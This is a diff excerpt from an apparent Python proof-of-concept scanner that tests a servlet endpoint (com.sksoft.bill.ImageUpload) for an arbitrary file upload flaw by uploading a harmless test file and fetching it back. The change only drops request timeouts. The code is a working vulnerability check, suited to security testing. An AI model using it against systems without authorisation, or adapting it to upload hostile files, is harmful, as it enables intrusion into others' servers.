@@ -45,8 +45,8 @@ class poc:
         url = "{}://{}/servlet/com.sksoft.bill.ImageUpload?filename=test.txt&filepath=/".format(scheme, netloc)
         data = '''123456'''
         try:
-            result = requests.post(url=url, data=data, headers=self.headers, verify=False, timeout=3, proxies=self.proxies)
-            req = requests.get("{}://{}/pictures/test.txt".format(scheme, netloc), headers=self.headers, verify=False, allow_redirects=False, timeout=3, proxies=self.proxies)
+            result = requests.post(url=url, data=data, headers=self.headers, verify=False, proxies=self.proxies)
+            req = requests.get("{}://{}/pictures/test.txt".format(scheme, netloc), headers=self.headers, verify=False, allow_redirects=False, proxies=self.proxies)
             if req.status_code == 200 and req.text.find("123456") != -1:
                 target = urlparse(url)
                 self.result_text += """\n        [+]    \033[32m检测到目标站点存在任意文件上传漏洞\033[0m
